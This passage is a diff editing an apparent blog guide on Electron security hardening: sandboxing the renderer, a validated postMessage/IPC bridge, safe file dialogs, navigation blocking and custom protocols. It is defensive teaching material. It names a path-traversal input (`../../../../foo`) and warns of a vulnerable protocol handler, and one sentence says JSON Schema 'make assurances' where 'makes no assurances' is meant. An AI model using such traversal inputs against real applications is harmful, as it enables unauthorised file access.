 * `nodeIntegrationInSubFrames` - Option for enabling Node support in sub-frames such as iframes and child windows, always set this to `false`.
-* `nativeWindowOpen` - Whether to use native `window.open()`, because what could go wrong? Defaults to `false`.
 * `safeDialogs` - Whether to enable browser-style consecutive dialog protection.
+* `sandbox` - Whether to enable the sandbox renderer associated with the window, making it compatible with the Chromium OS-level sandbox and disabling the Node.js engine. This is not the same as the `nodeIntegration` option and the APIs available to the preload script are more limited.
+* `webSecurity` - Whether to enable the same origin policy (SOP), setting this to `false` will kill the kitten nearest to you.
+* `webviewTag` - Whether to enable the `<webview>` tag. These tags are exceedingly dangerous, you should always disable this feature.
 
 There is no one flag to disable all of the Node integrations in the renderer process, so instead we must disable `nodeIntegration`, `nodeIntegrationInWorker`, `nodeIntegrationInSubFrames`, `webviewTag`, `enableRemoteModule`, and `nativeWindowOpen`. Then we enable `sandbox`,`contextIsolation`, and `webSecurity` to ensure any malicious code injected via XSS cannot easily escape the renderer process. As the [Electron Security documentation](https://electronjs.org/docs/tutorial/security) points out it's imperative to disable `nodeIntegration` as well as enable `contextIsolation` to ensure we properly contain the renderer process.
 
-Next we'll need to selectively re-enable some native functionality and expose it to the renderer process, otherwise we may as well just load the application in the browser. There are a few different ways we can selectively expose functionality to the DOM. The first way is using the `remote` module, but as the Electron documentation even points out this module is dangerous, and we've already disabled it so that's not an option. Electron provides another mechanism called the "preload script" that executes before the DOM is loaded and allows us to expose arbitrary JavaScript symbols to the DOM runtime, and with `contextIsolation` enable the preload script is somewhat safeguarded from tampering by the DOM code. T
+Next, we'll need to selectively re-enable some native functionality and expose it to the renderer process, otherwise we may as well just load the application in the browser. There are a few different ways we can selectively expose functionality to the DOM. The first way is using the `remote` module, but as the Electron documentation itself even points out, this module is dangerous, and we've already disabled it so that's not an option. Electron provides another mechanism called the "preload script" that executes before the DOM is loaded and allows us to expose arbitrary JavaScript symbols to the DOM runtime. With that and the `contextIsolation` enabled, the preload script is somewhat safeguarded from tampering by the DOM code. T
 
-The preload script always has access to the NodeJS APIs and has access to the same `window` object as the DOM. The intention of this functionality is so that we can re-introduce Node symbols. However, giving the DOM code direct access to Node symbols is dangerous, and will likely lead to escape vectors. We could also expose custom symbols that perform validation of arguments and this is slightly more safe, but not ideal. [Doyensec](https://blog.doyensec.com/2019/04/03/subverting-electron-apps-via-insecure-preload.html) has a couple great examples of attacking Node symbols that are re-introduced to the DOM runtime.
+The preload script always has access to the NodeJS APIs and to the same `window` object as the DOM. The intention of this functionality is so that we can re-introduce Node symbols. However, giving the DOM code direct access to Node symbols is dangerous, and will likely lead to escape vectors. We could also expose custom symbols that perform validation of arguments; this is slightly more safe, but not ideal. [Doyensec](https://blog.doyensec.com/2019/04/03/subverting-electron-apps-via-insecure-preload.html) has a couple great examples of how you can attack Node symbols they are reintroduced to the DOM runtime.
 
 Instead we'll leverage the browser's `postMessage` API to allow the preload script and the DOM to communicate over an existing mechanism _without exposing any privileged symbols_ or code directly to the sandboxed DOM code. 
 
@@ -415,7 +419,7 @@ Instead we'll leverage the browser's `postMessage` API to allow the preload scri
 [ Main Process ] <--(IPC)--> [ Preload ] <--(postMessage)--> [ DOM ]
 ```
 
-Below is my basic TypeScript interface for the JSON message we'll use to communicate between the Node (main) process and the untrusted DOM (renderer) process:
+Below is my basic TypeScript interface for the JSON message that we'll use to communicate between the Node (main) process and the untrusted DOM (renderer) process:
 
 ```typescript
 export interface IPCMessage {
@@ -434,7 +438,7 @@ export interface IPCMessage {
 * __method__: The name of the function we want to invoke in the Node process.
 * __data__: Parameters to the `method` specified in the message.
 
-This has the advantage of forcing the sandboxed code to communicate with the privileged code using data-only serialization protocols such as JSON. We can easily abstract away the messy IPC details with an Angular service. Here we leverage RXJS observables to hide some of the IPC details like `msgId`s and only expose a simple async request/response API:
+This has the advantage of forcing the sandboxed code to communicate with the privileged code using data-only serialization protocols such as JSON. We can easily abstract away the messy IPC details with an Angular service. Here we leverage RXJS observables to hide some of the IPC details like `msgIds` and only expose a simple async request/response API:
 
 #### [`ipc.service.ts`](src/app/providers/ipc.service.ts)
 ```typescript
@@ -483,7 +487,7 @@ export class IPCService {
 }
 ```
 
-Next in the preload script we ensure any given message (1) must be valid JSON, (2) contain the keys `type` and `method`, and `method` must start with the prefix `fs_` before passing it along via Electron's IPC to the main process. This extra namespace is helps ensure we do not inadvertently expose methods that we do not want exposed to the IPC interface. Note we can easily add additional namespaces if we want:
+Next, we ensure that any given message received by the preload script (1) must be valid JSON, (2) contain the keys `type` and `method`, and `method` must start with the prefix `fs_` before passing it along via Electron's IPC to the main process. This extra namespace helps ensure that we do not inadvertently expose methods that we do not want exposed to the IPC interface. Note that we can easily add additional namespaces if we want:
 
 #### [`preload.js`](preload.js)
 ```javascript
@@ -517,7 +521,7 @@ ipcRenderer.on('ipc', (_, msg) => {
 
 The preload script has two functions, one that does basic format verification of an incoming message (i.e. `request`) and forwards it on to the main process. The second functions takes `response` and `push` messages from the main process and sends them back to the DOM via `postMessage`.
 
-Once a message is sent from the preload script to the main process, it is then passed to our `dispatchIPC()` function, this function is responsible for invoking the proper handler `method`, passing the `data` parameter to the handler, and returning any `response` back to the caller. `IPCHandler` is just a class of static methods (more on this below):
+Once a message is sent from the preload script to the main process, it is then passed to our `dispatchIPC()` function. This function is responsible for invoking the proper handler `method`, passing the `data` parameter to the handler, and returning any `response` back to the caller. `IPCHandler` is just a class of static methods (more on this below):
 
 #### [`ipc.ts`](ipc/ipc.ts)
 ```typescript
@@ -543,9 +547,9 @@ From here we have a fully functional RPC/IPC interface between the trusted and u
 
 ### File Read
 
-The first common piece of functionality we'll want to restore to our sandboxed application is the ability to read and write to the file system. It would be easy to restrict the sandboxed code to only read/write to certain directories (such as an application subdirectory), but we'll first build an arbitrary file read/write interface that allows the user to select what file(s) to expose to the untrusted code. It's critical we only allow our sandboxed code to ask the trusted code to read a file, simply allowing to sandboxed code to ready any file without user interaction would defeat the purpose of sandboxing the code to begin with.
+The first common piece of functionality we'll want to restore to our sandboxed application is the ability to read and write to the file system. It would be easy to restrict the sandboxed code to only read/write to certain directories (such as an application subdirectory), but we'll first build an arbitrary file read/write interface that allows the user to select what file(s) to expose to the untrusted code. It's critical that we only allow our sandboxed code to ask the trusted code to read a file; simply allowing sandboxed code to ready any file without user interaction would defeat the purpose of sandboxing the code to begin with.
 
-We'll first create an IPC handler function that accepts parameters from the untrusted code such as the dialog text and default directory. Importantly, the Node process will not actually read any files based on the parameters from the untrusted code we require the user to actively select the files from the file system. The untrusted code only controls what the dialog says, and it could of course lie to the user but at the end of the day the user would have to actively expose the files to the application:
+We'll first create an IPC handler function that accepts parameters from the untrusted code such as the dialog text and default directory. Importantly, the renderer process cannot specify an arbitrary file path to read from, we instead require the user to actively select the files from the file system. The untrusted code only controls what the dialog says (and it could of course lie to the user) but at the end of the day, the user would have to actively expose the files to the application:
 
 #### [`ipc.ts`](ipc/ipc.ts)
 ```typescript
@@ -578,9 +582,9 @@ export class IPCHandlers {
 }
 ```
 
-The other piece that is controlled by the untrusted code in this example is the `req` parameter, which at this point is just a simple string, that presumably is JSON but if an attacker was able to compromise the sandboxed DOM code via something like cross-site script we can't make any assumptions about the format of this string. We can easily ensure it's valid JSON by simply parsing as such with `JSON.parse()` --but it's entirely possible the attacker could send us a JSON object of different types, lengths, etc. than we're expecting. This can lead to type confusion and mass assignment vulnerabilities among others if we're not careful.
+The other piece that is controlled by the untrusted code in this example is the `req` parameter, which at this point is just a simple string that presumably is JSON. But if an attacker were able to compromise the sandboxed DOM code via something like cross-site scripting, we can't make any assumptions about the format of this string. We can easily ensure it's valid JSON by simply parsing it with `JSON.parse()` — but it's entirely possible the attacker could send us a JSON object of different types, lengths, etc. than we're expecting. This can lead to type confusion and mass assignment vulnerabilities (among other vulns) if we're not careful.
 
-We can create a reusable TypeScript decorator as a convenient way to guardrail our RPC methods. Decorators are a powerful tool that enables us to create "method level" security controls. We are making two big assumptions with the following decorator 1) the wrapped method accepts a single string/JSON argument and 2) the method returns some kind of Promise, since we return a rejected Promise in the event the argument is not properly formatted. Writing a more generic version of this decorator is left as an exercise for the reader:
+We can create a reusable TypeScript decorator as a convenient way to guardrail our Remote Procedure Call (RPC) methods. Decorators are a powerful tool that enable us to create "method level" security controls. We are making two big assumptions with the following decorator: 1) the wrapped method accepts a single string/JSON argument and 2) the method returns some kind of Promise, since we return a rejected Promise in the event the argument is not properly formatted. Writing a more generic version of this decorator is left as an exercise for the reader:
 
 #### [`ipc.ts`](ipc/ipc.ts)
 ```typescript
@@ -624,13 +628,12 @@ export class IPCHandlers {
   static async fs_readFile(req: string): Promise<string> {
 ```
 
-There is some overlap here since we're using TypeScript, but JSON Schema gives us more control over how to validate the incoming JSON object than simply typecasting it to an interface. However, this technique can be easily repurposed into pure ES2015+ JavaScript too.
-
-However, JSON schema only validates the format of the object, it make assurances that the values within the JSON object are safe to use. We still must properly validate, normalize, sanitize, and/or encode values depending on the context in which they are used. 
+There is some validation overlap here since we're using TypeScript, but JSON Schema gives us more control over how to validate the incoming JSON object than simply typecasting it to an interface. However, this technique can be easily repurposed into pure ES2015+ JavaScript too.
+However, JSON schema only validates the format of the object; it make assurances that the values within the JSON object are safe to use. We still must properly validate, normalize, sanitize, and/or encode values depending on the context in which they are used.
 
 ### File Write
 
-To demonstrate this let's create another IPC handler that can be used to save or write files to the file system from the DOM/untrusted code. In this case the untrusted code controls the `filename` parameter, but our JSON Schema only validates that this parameter is a string. If that string contained a value such as `../../../../foo` it could be problematic. So it is paramount that we use `path.basename()` to ensure the dialog defaults to the correct path: 
+To demonstrate this, let's create another IPC handler that can be used to save or write files to the file system from the DOM/untrusted code. In this case, the untrusted code controls the `filename` parameter, but our JSON Schema only validates that this parameter is a string. If that string contained a value such as `../../../../foo`, it could be problematic. So it is paramount that we use `path.basename()` to ensure that the open file dialog defaults to the correct path:
 
 ```typescript
 export class IPCHandlers {
@@ -676,19 +679,19 @@ export class IPCHandlers {
   }
 ```
 
-This is of course just a simple example, in more complex APIs even more validation/normalization/canonicalization/encoding may be required to safely use a given value. The key take away here is that we cannot rely upon JSON Schema to do all of the validation, we still need to treat these values as untrusted parameters.
+This is just a simple example of course. In more complex APIs, even more validation/normalization/canonicalization/encoding may be required to safely use a given value. The key takeaway here is that we cannot rely upon JSON Schema to do all of the validation; we still need to treat these values as untrusted parameters.
 
-In the end we're left with a very simple API for our component code, and if we wanted we could even mock many of the existing Node APIs into an IPC/RPC sandboxed version. The example we just build exposes the following API to read files from within the sandbox:
+In the end we're left with a very simple API for our component code, and if we wanted we could make mock versions of existing Node APIs into an IPC/RPC sandboxed version. The example we just built exposes the following API to read files from within the sandbox:
 
 ```typescript
 const resp = await this._fsService.readFile('Open File', 'Please select a file');
 ```
 
-Since we've abstracted away many of the security complexities we're left with a reusable, safe, and easy to use API call. I'd personally argue that a "secure" but difficult to use API is in fact just insecure, since the human programmers will be discouraged from using it.
+Since we've abstracted away many of the security complexities, we're now left with a reusable, safe, and easy-to-use API call. I'd personally argue that a "secure" but difficult to use API is in fact just insecure, since human programmers will be discouraged from using it.
 
 ### Navigation
 
-Next we'll disable navigation in our application windows, another method to load remote code or bypass the CSP would be to navigate the frame away from our application to an attacker controlled origin. [Disabling navigation while in sandbox mode](https://github.com/electron/electron/issues/8841) may be a little buggy depending on your version of Electron but it's still a good idea to implement. These callbacks go in your `main.ts` and affect the entire application:
+Next we'll disable navigation in our application windows. Another method to load remote code or bypass the CSP would be to navigate the frame away from our application to an attacker-controlled origin. [Disabling navigation while in sandbox mode](https://github.com/electron/electron/issues/8841) may be a little buggy depending on your version of Electron but it's still a good idea to implement. These callbacks go in your `main.ts` and affect the entire application:
 
 #### [`main.ts`](main.ts#L96)
 ```typescript
@@ -710,7 +713,7 @@ Since we've implemented a single-page application using Angular, there's no legi
 
 ### Origin Security
 
-We also want to avoid having the application execute within the `file://` origin, as we've discussed `file://` origins can be problematic and expose potential opportunities for attackers to bypass the CSP and load remote code. Futhermore, since `file://` URIs lack proper MIME types Electron will [refuse to load ES6 modules](https://github.com/electron/electron/issues/12011) from this origin. Therefore, we can both improve security and enable the use of modern ES6 modules at the same type by switching to a custom protocol. This is done in Electron using `RegisterBufferProtocolRequest`, ironically all of the provided [examples in the Electron documentation are vulnerable to path traversal](https://electronjs.org/docs/api/protocol), which would allow an attacker to read any file on the filesystem even if `nodeIntegration` is disabled:
+We also want to avoid having the application execute within the `file://` origin. As we've discussed, `file://` origins can be problematic and expose potential opportunities for attackers to bypass the CSP and load remote code. Futhermore, since `file://` URIs lack proper MIME types, Electron will [refuse to load ES6 modules](https://github.com/electron/electron/issues/12011) from this origin. Therefore, we can both improve security and enable the use of modern ES6 modules at the same type by switching to a custom protocol. This is done in Electron using `RegisterBufferProtocolRequest`, ironically all of the provided [examples in the Electron documentation are vulnerable to path traversal](https://electronjs.org/docs/api/protocol), which would allow an attacker to read any file on the filesystem even if `nodeIntegration` is disabled:
 
 #### Vulnerable Protocol Handler
 ```javascript
@@ -782,4 +785,4 @@ We do have to cede one unsafe content source: `style-src 'self' 'unsafe-inline'`
 
 ## When in Doubt, Castle
 
-Having spent my entire career finding flaws in software, I can assure you an even moderately sophisticated attacker will actively seek out single points of failure to exploit within an application. The ["defense in depth"](https://en.wikipedia.org/wiki/Defense_in_depth_(computing)) mantra is best thought of as a fractal, applying not just to networks and systems, but also to trust boundaries within an application. By taking the area of the application with the largest attack surface (the DOM) and layering defences around it, we significantly reduce the chance of catastrophic failure. This principle can, and should, be applied to any software not just Electron-based applications.
+Having spent my entire career finding flaws in software, I can assure you an even moderately sophisticated attacker will actively seek out single points of failure to exploit within an application. The ["defense in depth"](https://en.wikipedia.org/wiki/Defense_in_depth_(computing)) mantra is best thought of as a fractal, applying not just to networks and systems, but also to trust boundaries within an application. By taking the area of the application with the largest attack surface (the DOM) and layering defenses around it, we significantly reduce the chance of catastrophic failure. This principle can, and should, be applied to any software, not just Electron-based applications.
